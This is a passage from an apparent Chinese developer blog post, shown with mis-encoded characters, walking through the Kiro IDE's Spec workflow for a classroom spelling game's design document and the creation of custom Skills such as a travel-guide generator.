5. å½“æ¸¸æˆç³»ç»Ÿæ£€æµ‹åˆ°è§¦æ‘¸è®¾å¤‡æ—¶ï¼Œæ¸¸æˆç³»ç»Ÿåº”å½“å¢å¤§å¯ç‚¹å‡»åŒºåŸŸè‡³å°‘44x44åƒç´ ä»¥ç¬¦åˆå¯è®¿é—®æ€§æ ‡å‡†

</code></pre>
<h4 data-id="heading-13">ï¼ˆ4ï¼‰æ ¹æ®è‡ªå·±çš„éœ€æ±‚è¿›è¡Œå¾®è°ƒ</h4>
<blockquote>
<p>ç°åœ¨æˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªå®Œæ•´çš„éœ€æ±‚æ–‡æ¡£ä»¥åŠå…·ä½“çš„ç”Ÿæˆè§„åˆ™å’ŒéªŒæ”¶æµç¨‹ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®è‡ªå·±çš„å…·ä½“éœ€æ±‚è¿›è¡Œè°ƒè¯•ï¼Œå‡è®¾ä½ è¿˜æœ‰å…¶ä»–çš„éœ€æ±‚ï¼Œä¹Ÿå¯ä»¥å†æ·»åŠ åˆ°æ–‡æ¡£ä¸­ï¼Œç›®çš„æ˜¯ä¸ºåç»­ç”Ÿæˆ<code>code</code> æä¾›ä¸€ä¸ªæ ‡å‡†å’Œä¾æ®ã€‚</p>
</blockquote>
<p>ç„¶åæˆ‘ä»¬å°±çœ‹åˆ°æœ‰ä¸€ä¸ªè¿™ä¸ª "Move to design phase" æ„æ€å°±æ˜¯è¿›å…¥è®¾è®¡é˜¶æ®µï¼š</p>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/93cfba8b538e436da26f3b4bcdc7b2d9~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=UVP4i9lF%2FxbYiLIVRoHfk6kA1EA%3D" alt="b8f72f95-4eae-43ec-831d-2ed632db2a78.png" loading="lazy"/></p>
<h4 data-id="heading-14">ï¼ˆ5ï¼‰<code>Move to design phase</code> è¿›å…¥è®¾è®¡é˜¶æ®µ</h4>
<p><strong>ç°åœ¨å®ƒå¸®æˆ‘ç”Ÿæˆäº†ä¸€ä¸ªé¡¹ç›®è®¾è®¡æ–‡æ¡£ï¼š</strong></p>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/1d053aa8b7334868a5849d151ae9f763~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=Q13mqYwqITTsAb4k%2FkzaUdUwha4%3D" alt="æˆªå±2026-02-04 17.38.11.png" loading="lazy"/></p>
<p><strong>è¯¦ç»†å†…å®¹å¦‚ä¸‹ï¼Œå½“ç„¶åœ¨æ­¤æ­¥éª¤ä½ ä¾ç„¶å¯ä»¥å¯¹æ–‡æ¡£è¿›è¡Œä¿®æ”¹ï¼š</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment"># è®¾è®¡æ–‡æ¡£</span>

![æˆªå±<span class="hljs-number">2026</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">17.43</span>.<span class="hljs-number">01</span>.png](https:<span class="hljs-comment">//p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/cc90dcbae9db4d05aaaad4bae399b9cf~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=9oE41Kqh%2BOwq0P%2BVKa5jwkpZ1dU%3D)</span>
<span class="hljs-comment">## æ¦‚è¿°</span>

è¯¾å ‚æ‹¼å†™æ¸¸æˆæ˜¯ä¸€ä¸ªåŸºäº Web çš„äº’åŠ¨æ•™è‚²åº”ç”¨ï¼Œé‡‡ç”¨å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¶æ„ã€‚ç³»ç»Ÿçš„æ ¸å¿ƒåŠŸèƒ½åŒ…æ‹¬ï¼šéšæœºç”Ÿæˆæ‹¼å†™é¢˜ç›®ã€éªŒè¯å­¦ç”Ÿç­”æ¡ˆã€ç®¡ç†å•è¯åº“ã€è·Ÿè¸ªå­¦ä¹ è¿›åº¦ã€‚è®¾è®¡å¼ºè°ƒç®€æ´æ€§ã€å¯æ‰©å±•æ€§å’Œæ•™è‚²æ•ˆæœã€‚

<span class="hljs-comment">## æ¶æ„</span>

ç³»ç»Ÿé‡‡ç”¨ä¸‰å±‚æ¶æ„ï¼š

<span class="hljs-number">1</span>. **è¡¨ç¤ºå±‚ï¼ˆPresentation Layerï¼‰**: è´Ÿè´£ç”¨æˆ·ç•Œé¢æ¸²æŸ“å’Œç”¨æˆ·äº¤äº’
<span class="hljs-number">2</span>. **ä¸šåŠ¡é€»è¾‘å±‚ï¼ˆBusiness Logic Layerï¼‰**: å¤„ç†æ¸¸æˆé€»è¾‘ã€ç­”æ¡ˆéªŒè¯ã€å¾—åˆ†è®¡ç®—
<span class="hljs-number">3</span>. **æ•°æ®è®¿é—®å±‚ï¼ˆData Access Layerï¼‰**: ç®¡ç†å•è¯åº“å’Œç”¨æˆ·æ•°æ®çš„æŒä¹…åŒ–

<span class="hljs-comment">### æ¶æ„å›¾</span>


â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      è¡¨ç¤ºå±‚ (UI Components)          â”‚
â”‚  - æ¸¸æˆç•Œé¢                          â”‚
â”‚  - å•è¯åº“ç®¡ç†ç•Œé¢                     â”‚
â”‚  - å¾—åˆ†æ˜¾ç¤º                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      ä¸šåŠ¡é€»è¾‘å±‚ (Game Engine)        â”‚
â”‚  - QuestionGenerator                â”‚
â”‚  - AnswerValidator                  â”‚
â”‚  - ScoringSystem                    â”‚
â”‚  - HintProvider                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      æ•°æ®è®¿é—®å±‚ (Data Layer)         â”‚
â”‚  - WordBankRepository               â”‚
â”‚  - ScoreRepository                  â”‚
â”‚  - LocalStorage / Database          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜


<span class="hljs-comment">## ç»„ä»¶å’Œæ¥å£</span>

<span class="hljs-comment">### 1. QuestionGeneratorï¼ˆé¢˜ç›®ç”Ÿæˆå™¨ï¼‰</span>

è´Ÿè´£ä»å•è¯åº“ä¸­é€‰æ‹©å•è¯å¹¶ç”Ÿæˆæ‰“ä¹±å­—æ¯çš„é¢˜ç›®ã€‚

**æ¥å£ï¼š**

```typescript
<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">QuestionGenerator</span> </span>{
  <span class="hljs-comment">// æ ¹æ®éš¾åº¦çº§åˆ«ç”Ÿæˆæ–°é¢˜ç›®</span>
  <span class="hljs-title function_ invoke__">generateQuestion</span>(<span class="hljs-attr">difficulty</span>: DifficultyLevel): Question

  <span class="hljs-comment">// éªŒè¯ç”Ÿæˆçš„é¢˜ç›®æ˜¯å¦æœ‰æ•ˆ</span>
  <span class="hljs-title function_ invoke__">validateQuestion</span>(<span class="hljs-attr">question</span>: Question): <span class="hljs-keyword">boolean</span>
}


**æ ¸å¿ƒæ–¹æ³•ï¼š**

- `<span class="hljs-title function_ invoke__">selectWord</span>(<span class="hljs-attr">difficulty</span>: DifficultyLevel): <span class="hljs-keyword">string</span>` - æ ¹æ®éš¾åº¦ä»å•è¯åº“éšæœºé€‰æ‹©å•è¯
- `<span class="hljs-title function_ invoke__">shuffleLetters</span>(<span class="hljs-attr">word</span>: <span class="hljs-keyword">string</span>): <span class="hljs-keyword">string</span>` - æ‰“ä¹±å•è¯å­—æ¯é¡ºåº
- `<span class="hljs-title function_ invoke__">ensureDifferent</span>(<span class="hljs-attr">original</span>: <span class="hljs-keyword">string</span>, <span class="hljs-attr">shuffled</span>: <span class="hljs-keyword">string</span>): <span class="hljs-keyword">string</span>` - ç¡®ä¿æ‰“ä¹±åä¸åŸå•è¯ä¸åŒ

<span class="hljs-comment">### 2. AnswerValidatorï¼ˆç­”æ¡ˆéªŒè¯å™¨ï¼‰</span>

éªŒè¯å­¦ç”Ÿæäº¤çš„ç­”æ¡ˆæ˜¯å¦æ­£ç¡®ã€‚

**æ¥å£ï¼š**

```typescript
<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">AnswerValidator</span> </span>{
  <span class="hljs-comment">// éªŒè¯ç­”æ¡ˆæ˜¯å¦æ­£ç¡®ï¼ˆå¿½ç•¥å¤§å°å†™ï¼‰</span>
  <span class="hljs-title function_ invoke__">validate</span>(<span class="hljs-attr">userAnswer</span>: <span class="hljs-keyword">string</span>, <span class="hljs-attr">correctAnswer</span>: <span class="hljs-keyword">string</span>): <span class="hljs-keyword">boolean</span>

  <span class="hljs-comment">// éªŒè¯è¾“å…¥æ˜¯å¦åªåŒ…å«å­—æ¯</span>
  <span class="hljs-title function_ invoke__">validateInput</span>(<span class="hljs-attr">input</span>: <span class="hljs-keyword">string</span>): <span class="hljs-keyword">boolean</span>
}
 

**æ ¸å¿ƒæ–¹æ³•ï¼š**

- `<span class="hljs-title function_ invoke__">normalize</span>(<span class="hljs-attr">text</span>: <span class="hljs-keyword">string</span>): <span class="hljs-keyword">string</span>` - æ ‡å‡†åŒ–æ–‡æœ¬ï¼ˆè½¬å°å†™ã€å»ç©ºæ ¼ï¼‰
- `<span class="hljs-title function_ invoke__">isAlphabetic</span>(<span class="hljs-attr">text</span>: <span class="hljs-keyword">string</span>): <span class="hljs-keyword">boolean</span>` - æ£€æŸ¥æ˜¯å¦åªåŒ…å«å­—æ¯

<span class="hljs-comment">### 3. ScoringSystemï¼ˆå¾—åˆ†ç³»ç»Ÿï¼‰</span>

è®¡ç®—å’Œç®¡ç†å­¦ç”Ÿå¾—åˆ†ã€‚

**æ¥å£ï¼š**

```typescript
<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ScoringSystem</span> </span>{
  <span class="hljs-comment">// è®¡ç®—ç­”é¢˜å¾—åˆ†</span>
  <span class="hljs-title function_ invoke__">calculateScore</span>(<span class="hljs-attr">isCorrect</span>: <span class="hljs-keyword">boolean</span>, <span class="hljs-attr">hintsUsed</span>: number, <span class="hljs-attr">timeSpent</span>: number): number

  <span class="hljs-comment">// æ›´æ–°æ€»åˆ†</span>
  <span class="hljs-title function_ invoke__">updateTotalScore</span>(<span class="hljs-attr">score</span>: number): <span class="hljs-keyword">void</span>

  <span class="hljs-comment">// è·å–å½“å‰ç»Ÿè®¡ä¿¡æ¯</span>
  <span class="hljs-title function_ invoke__">getStatistics</span>(): GameStatistics
}
 

**å¾—åˆ†è§„åˆ™ï¼š**

- åŸºç¡€åˆ†ï¼šæ­£ç¡®ç­”æ¡ˆ <span class="hljs-number">10</span> åˆ†
- æç¤ºæƒ©ç½šï¼šæ¯ä½¿ç”¨ä¸€æ¬¡æç¤ºå‡ <span class="hljs-number">2</span> åˆ†
- æ—¶é—´å¥–åŠ±ï¼šå¿«é€Ÿç­”é¢˜ï¼ˆ&lt; <span class="hljs-number">10</span> ç§’ï¼‰é¢å¤– +<span class="hljs-number">3</span> åˆ†
- æœ€ä½åˆ†ï¼šæ¯é¢˜æœ€ä½ <span class="hljs-number">1</span> åˆ†

..........
</code></pre>
<h4 data-id="heading-15">ï¼ˆ6ï¼‰ç”Ÿæˆæµ‹è¯•ä»»åŠ¡åˆ—è¡¨</h4>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/9e56275a20814a20ab262993cb66c1f5~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=0e4WBogd3e0ist2e6jLmcTYO8vw%3D" alt="æˆªå±2026-02-04 17.44.28.png" loading="lazy"/></p>
<p>ç°åœ¨æœ‰ä¸¤ä¸ªé€‰é¡¹ï¼Œä¸€ä¸ªæ˜¯ä¿æŒå¯é€‰ä»»åŠ¡ï¼ˆæ›´å¿«çš„<code>MVP</code>ï¼‰ï¼Œæˆ‘é€‰æ‹©çš„æ˜¯ï¼š "å°†æ‰€æœ‰ä»»åŠ¡è®¾ä¸ºå¿…é¡»"</p>
<h4 data-id="heading-16">ï¼ˆ7ï¼‰ä»»åŠ¡å®Œæˆ</h4>
<blockquote>
<p>æ­¤æ—¶æˆ‘ä»¬éœ€è¦çš„éœ€æ±‚æ–‡æ¡£ï¼Œè®¾è®¡æ–‡æ¡£å’Œæµ‹è¯•æ–‡æ¡£éƒ½å·²ç»å…¨äº†ï¼Œé‡Œé¢å‘Šè¯‰æˆ‘ä»¬æ¥ä¸‹æ¥é¡¹ç›®å…·ä½“ç»†èŠ‚æ˜¯å•¥ï¼Œé‚£ä¹ˆåé¢æˆ‘ä»¬å°±å¯ä»¥æ‹¿ç€è¿™äº›æ–‡æ¡£å–‚ç»™æˆ‘ä»¬çš„é¡¹ç›®ï¼Œè®©ä»–å»è®¾è®¡é¡µé¢äº†ï½</p>
</blockquote>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/399653342a314905876b6642ac522848~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=V3M1Nb2y7h2n2ZGXv9HMVSR3dsc%3D" alt="æˆªå±2026-02-04 17.48.56.png" loading="lazy"/></p>
<hr/>
<p><strong>æ€»ç»“ï¼š</strong></p>
<p>ä»¥ä¸Šå°±æ˜¯<code>Spec</code>çš„æ•´ä¸ªæµç¨‹ï¼Œä»¥æˆ‘çš„ä½¿ç”¨æ„Ÿå—æ¥çœ‹ï¼Œè¿™ä¸ª<code>Spec</code>æ¯”è¾ƒé€‚ç”¨äºä»å¤´å¼€å§‹çš„æ–°é¡¹ç›®ï¼Œæˆ–è€…æ˜¯ä»å¤´å¼€å§‹ä¸€ä¸ªå®Œæ•´çš„æ–°éœ€æ±‚ï¼Œå¦‚æœä½ æ˜¯åªæ˜¯ä¿®ä¿®è¡¥è¡¥ï¼Œè¿˜æ˜¯å»ºè®®ä½¿ç”¨<code>Vibe</code>æ¨¡å¼ï¼Œæ›´è½»ä¾¿ï¼Œæ›´ç®€æ´ã€‚</p>
<hr/>
<h3 data-id="heading-17">2. æ¥ä¸‹æ¥æ˜¯<code>Skills</code></h3>
<h4 data-id="heading-18">ï¼ˆ1ï¼‰æ‰‹åŠ¨åˆ›å»ºå®šåˆ¶åŒ–äºè‡ªå·±é¡¹ç›®çš„<code>skill</code></h4>
<blockquote>
<p>æˆ‘è®©<code>Kiro</code>å¸®æˆ‘ç”Ÿæˆä¸€ä¸ªå…³äºæ¥å£<code>API</code>æ¥å…¥çš„ç¼–å†™è§„èŒƒ</p>
</blockquote>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/8d90c7d817844ec6ae77599ceb3d7c36~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=V5cwBDr2Uv3QB4d8jklW%2Bvi5dss%3D" alt="æˆªå±2026-02-06 15.24.26.png" loading="lazy"/></p>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/546f35b534944a3ea10057270e792e43~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=pcNe%2FqQw7ZEpPFW%2BVv%2BxGLBSj6M%3D" alt="æˆªå±2026-02-06 15.24.46.png" loading="lazy"/></p>
<p><strong>è¿™å°±æ˜¯æ ¹æ®æˆ‘å½“å‰é¡¹ç›®å…¨é¢æ‰«æåï¼Œæ ¹æ®ä»¥åçš„è§„åˆ™ç”Ÿæˆçš„ä¸€ä¸ªæ¥å¶ç¼–å†™è§„èŒƒ</strong></p>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/297b68f7fa73462a9b2edd5a3763a0c3~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=u2w6faX%2Fp5EEArwZr44lmChsHmA%3D" alt="æˆªå±2026-02-06 15.27.45.png" loading="lazy"/></p>
<p><strong>å¦‚æœä½ æœ‰è‡ªå·±çš„è§„åˆ™ï¼Œå¯ä»¥æ·»åŠ æ–°çš„è§„åˆ™åˆ°è¿™ä¸ªæ–‡æ¡£ä¸­ï¼š</strong></p>
<blockquote>
<p>å¦‚ä¸‹ï¼Œæˆ‘éœ€è¦æ·»åŠ å…³äºé‡å¤æ¥å£çš„æ£€æŸ¥</p>
</blockquote>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/f99f44fd47f945f2ad8280edf27103fa~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=sZGCFA8PqvJuOQmNFxM6cbVkGNY%3D" alt="æˆªå±2026-02-06 15.35.56.png" loading="lazy"/></p>
<p><strong>æ›´æ–°åçš„ç»“æœï¼š</strong></p>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/610d56de0cfc454f8127ff603163ab41~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=zxJK5LOiY7mk%2BqZDx%2FODAN1o%2FTo%3D" alt="æˆªå±2026-02-06 15.36.58.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-19">å‘èµ·æ€è€ƒï¼Ÿï¼Ÿï¼Ÿ</h2>
<p>é™¤äº†æ·»åŠ <code>AIæ¥å£è§„èŒƒæ–‡æ¡£</code>ï¼Œæˆ‘ä»¬æƒ³æƒ³å¹³å¸¸è‡ªå·±å“ªæ–¹é¢çš„å·¥ä½œæ¯”è¾ƒè€—è´¹æ—¶é—´ï¼Œå¹¶ä¸”å¤§éƒ¨åˆ†æ˜¯æœ‰ä¸€å®šè§„åˆ™ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>skill</code>çš„æ–¹å¼ï¼Œä¸€æ¬¡æ€§è®©<code>AI</code>äº†è§£æˆ‘ä»¬çš„å¤æ‚çš„è¯‰æ±‚ï¼Œæ¯”å¦‚ï¼šâ€œä»£ç ä¼˜åŒ–â€ã€â€œåˆ›å»ºæ–°ç»„ä»¶â€ â€œåŸå‹è¿˜åŸâ€ éƒ½å¯ä»¥æ˜¯ä¸€å¥—å®Œæ•´çš„è§„åˆ™ï¼Œä¸”ä¹Ÿå¯ä»¥éšç€ä½¿ç”¨æ¥å®Œå–„ä½ çš„è§„åˆ™ï¼Œæ¸è¿›æ˜ç»†ï¼Œè®©ä»–æˆä¸ºä¸€ä¸ªä½ é è°±çš„å·¥ä½œä¼™ä¼´ã€‚</p>
<h3 data-id="heading-20">é™¤äº†å¯ä»¥è‡ªå·±åˆ›å»ºï¼Œç°åœ¨å¸‚åœºä¸Šä¹Ÿæœ‰å¾ˆå¤šå¼€æºçš„<code>Skills</code>ï¼Œå¯ä»¥ä¾›å¤§å®¶é€‰æ‹©ï¼š</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fai.codefather.cn%2Fskills" target="_blank" title="https://ai.codefather.cn/skills" ref="nofollow noopener noreferrer">é±¼çš®å¤§ä½¬çš„AIå¯¼èˆªç½‘ç«™çš„æ¨è Skills</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FW7-olJj_QQdyYix1XP7ZeQ" target="_blank" title="https://mp.weixin.qq.com/s/W7-olJj_QQdyYix1XP7ZeQ" ref="nofollow noopener noreferrer">è¿™ 6 ä¸ªè¶…ç¥çš„ SKillsï¼Œåœ¨ GitHub ä¸Šæ€ç–¯äº†</a></p>
<p>é™¤äº†å·¥ä½œéœ€è¦ï¼Œä¾‹å¦‚æˆ‘ä»¬éœ€è¦ä¸€ä¸ªç”Ÿæˆæ—…æ¸¸æ”»ç•¥ï¼Œæˆ‘çš„è¦æ±‚å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs">æˆ‘æƒ³ç”Ÿæˆä¸€ä¸ªæ—…æ¸¸æ”»ç•¥çš„skillï¼Œæ ¹æ®æˆ‘çš„è¾“å…¥åŸå¸‚ï¼Œæ¨èè¯¥åŸå¸‚æˆ–è€…è¿™ä¸ªåŸå¸‚å‘¨è¾¹çš„5ä¸ªæ™¯ç‚¹ï¼Œæ™¯ç‚¹å¯ä»¥æ˜¯ï¼š å¤å»ºç­‘ã€ åšç‰©é¦†ã€ éç‰©è´¨æ–‡åŒ–é—äº§ ã€é—å€ ã€ è‘—åçš„4Aæ™¯ç‚¹ æˆ–è€…æ˜¯ è€è¡— ã€ æ°‘ä¿—ã€æ¼”å‡ºã€å¤§å‹æ–‡è‰ºå›­åŒºï¼ˆä¾‹å¦‚ï¼šå´æ¡¥æ‚æŠ€å¤§ä¸–ç•Œï¼‰ã€å¤§å‹çš„æƒ…æ™¯å‰§æ¼”å‡º ä»¥åŠå’Œäººæ–‡ç›¸å…³çš„ç­‰ ï¼Œ ç»™å‡ºæ™¯ç‚¹é™„è¿‘çš„åä½é›†å›¢çš„é…’åº—å‚è€ƒï¼Œç»™3ä¸ªï¼Œç»™å‡ºæ™¯ç‚¹å’Œæ™¯ç‚¹ä¹‹é—´çš„è·ç¦»ï¼Œå•ä½kmï¼Œ  æˆ‘é»˜è®¤æ˜¯ä»åŒ—äº¬è‡ªé©¾å‡ºå‘ï¼Œå¦‚æœè¡Œç¨‹è¿‡è¿œï¼ˆè¶…è¿‡600km) ,æé†’æˆ‘æ˜¯å¦è¦æ›´æ¢äº¤é€šå·¥å…·ï¼Œå¦‚æœç­›é€‰å‡ºçš„æ™¯ç‚¹ï¼Œåœ¨å½“å‰çš„æ—¶é—´å­£èŠ‚ä¸æ˜¯æœ€å¥½çš„å­£èŠ‚ï¼Œæˆ–è€…å¯èƒ½ä¸å¼€æ”¾ï¼Œä¹Ÿè¯·æç¤ºæˆ‘æ˜¯å¦æ›´æ¢æ™¯ç‚¹ï¼Œæˆ–è€…æ›´æ¢åŸå¸‚ï¼Œ
</code></pre>
<p>ç”Ÿæˆåï¼Œæˆ‘å¯ä»¥æ ¹æ®è‡ªå·±çš„æƒ³æ³•ï¼Œå†è¿›è¡Œä¿®æ”¹ï¼š</p>
<pre><code class="hljs">å¸®æˆ‘æ›´æ–°è¿™ä¸ªskill ï¼Œå¦‚æœæˆ‘æå‡ºå» æŸä¸ªåŸå¸‚æ—…æ¸¸ï¼Œè¯·æé—®æˆ‘æ—…æ¸¸çš„å¤©æ•°ï¼Œä»¥åŠæ¯å¤©æ¨èä¸€æ¬¾è¯¥åŸå¸‚çš„è‘—åå°åƒï¼Œæˆ–è€… è¿™ä¸ªåŸå¸‚çš„ä¸»æ‰“çš„å°åƒï¼Œæˆ‘åˆšåˆšæ·»åŠ äº†ä¸€äº›å¸¸ä½çš„é…’åº—ï¼Œå¸®æˆ‘ä¸€èµ·æ›´æ–°
</code></pre>
<p>ä¸‹é¢æ˜¯æˆ‘ç”Ÿæˆçš„<code>skill</code>çš„<code>.md</code>æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">inclusion:</span> <span class="hljs-string">manual</span>
<span class="hljs-meta">---
</span>
<span class="hljs-comment"># ğŸ—ºï¸ äººæ–‡æ—…æ¸¸æ”»ç•¥ç”Ÿæˆå™¨</span>

<span class="hljs-string">**è§¦å‘æ¡ä»¶ï¼šæç¤ºè¯åŒ…å«"æ—…æ¸¸"ã€"æ”»ç•¥"ã€"æ™¯ç‚¹"ã€"å‡ºè¡Œ"ã€"è‡ªé©¾"ç­‰å…³é”®è¯ï¼Œæˆ–ç›´æ¥è¾“å…¥åŸå¸‚åç§°**</span>

<span class="hljs-comment">## åŸºæœ¬è®¾å®š</span>

<span class="hljs-bullet">-</span> <span class="hljs-string">å‡ºå‘åœ°ï¼šåŒ—äº¬ï¼ˆé»˜è®¤è‡ªé©¾ï¼‰</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">å½“å‰æ—¥æœŸï¼šæ ¹æ®å®é™…æ—¥æœŸåˆ¤æ–­å­£èŠ‚</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">æ—…æ¸¸å¤©æ•°ï¼š**éœ€å…ˆè¯¢é—®ç”¨æˆ·**</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">æ™¯ç‚¹æ•°é‡ï¼šæ ¹æ®å¤©æ•°åŠ¨æ€è°ƒæ•´ï¼ˆæ¯å¤©1-2ä¸ªæ™¯ç‚¹ï¼‰</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">é…’åº—å“ç‰Œï¼šåä½é›†å›¢æ——ä¸‹ï¼ˆå…¨å­£ã€æ±‰åº­ã€æ¡”å­ã€æ°´æ™¶ã€CitiGOã€æ¼«å¿ƒã€èŠ±é—´å ‚ã€æµ·å‹ã€ç¦§ç¥ç­‰ï¼‰</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">æ¯ä¸ªæ™¯ç‚¹æ¨è3ä¸ªé™„è¿‘åä½é…’åº—</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">æ¯æ—¥å°åƒï¼šæ¯å¤©æ¨è1æ¬¾å½“åœ°è‘—åå°åƒæˆ–ä¸»æ‰“ç¾é£Ÿ</span>

<span class="hljs-comment">## æ™¯ç‚¹ç­›é€‰èŒƒå›´</span>

<span class="hljs-string">ä¼˜å…ˆæ¨èä»¥ä¸‹ç±»å‹çš„äººæ–‡æ™¯ç‚¹ï¼ˆéè‡ªç„¶é£å…‰ç±»ï¼‰ï¼š</span>

<span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">**å¤å»ºç­‘**ï¼šå¤åŸã€å¤é•‡ã€å¯ºåº™ã€ç¥ å ‚ã€åŸæ¥¼ã€å¤å¡”ç­‰</span>
<span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">**åšç‰©é¦†**ï¼šçœçº§/å¸‚çº§åšç‰©é¦†ã€ä¸“é¢˜åšç‰©é¦†ã€çºªå¿µé¦†ç­‰</span>
<span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">**éç‰©è´¨æ–‡åŒ–é—äº§**ï¼šä¼ ç»ŸæŠ€è‰ºä½“éªŒåœ°ã€éé—å±•ç¤ºé¦†ç­‰</span>
<span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">**å†å²é—å€**ï¼šå¤æˆ˜åœºã€å¤éƒ½é—å€ã€è€ƒå¤é—å€å…¬å›­ç­‰</span>
<span class="hljs-number">5</span><span class="hljs-string">.</span> <span class="hljs-string">**4A/5Aæ™¯åŒº**ï¼šä»¥äººæ–‡ç±»ä¸ºä¸»çš„é«˜ç­‰çº§æ™¯åŒº</span>
<span class="hljs-number">6</span><span class="hljs-string">.</span> <span class="hljs-string">**è€è¡—/å¤è¡—**ï¼šå†å²æ–‡åŒ–è¡—åŒºã€ä¼ ç»Ÿå•†ä¸šè¡—ç­‰</span>
<span class="hljs-number">7</span><span class="hljs-string">.</span> <span class="hljs-string">**æ°‘ä¿—ä½“éªŒ**ï¼šæ°‘ä¿—æ‘ã€ä¼ ç»Ÿé›†å¸‚ã€åœ°æ–¹ç‰¹è‰²æ´»åŠ¨ç­‰</span>
